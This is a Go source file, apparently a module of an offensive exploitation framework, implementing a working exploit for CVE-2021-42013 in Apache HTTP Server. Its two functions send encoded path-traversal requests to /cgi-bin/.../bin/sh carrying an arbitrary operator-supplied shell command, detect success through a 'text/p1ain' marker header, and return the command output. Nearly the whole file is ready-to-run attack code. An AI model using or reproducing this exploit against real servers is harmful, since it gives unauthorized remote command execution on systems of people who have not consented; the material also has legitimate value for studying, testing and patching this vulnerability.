package exp_apache_httpd

import (
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"strings"
)

type Exp_CVE_2021_42013 struct {
	exp_templates.ExpTemplate
}

func (self *Exp_CVE_2021_42013) Attack_cmd1() (expResult exp_model.ExpResult) {
	// 默认配置
	headers := self.GetInitExpHeaders()

	// 构造payload
	payload := `echo Content-Type: text/p1ain; echo; ` + self.MustGetStringParam("cmd")

	target := strings.TrimRight(self.Params.BaseParam.Target, "/") + "/cgi-bin/.%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh"

	// 发送请求
	httpresp := self.HttpPostWithSocket(target, payload, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	expResult.RawResult = httpresp.RawFullResp
	if httpresp.Resp.Header.Get("Content-Type") == "text/p1ain" {
		self.EchoSuccessMsg("漏洞存在")
		expResult.Result = httpresp.Body

	}
	return
}

func (self *Exp_CVE_2021_42013) Attack_cmd2() (expResult exp_model.ExpResult) {
	// 默认配置
	headers := self.GetInitExpHeaders()

	// 构造payload
	payload := `echo Content-Type: text/p1ain; echo; ` + self.MustGetStringParam("cmd")

	target := strings.TrimRight(self.Params.BaseParam.Target, "/") + "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"

	// 发送请求
	httpresp := self.HttpPostWithoutRedirect(target, payload, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	expResult.RawResult = httpresp.RawFullResp
	if httpresp.Resp.Header.Get("Content-Type") == "text/p1ain" {
		self.EchoSuccessMsg("漏洞存在")
		expResult.Result = httpresp.Body

	}
	return
}

func init() {
	exp_register.ExpStructRegister(&Exp_CVE_2021_42013{}, "exp_CVE_2021_42013.yml")

}
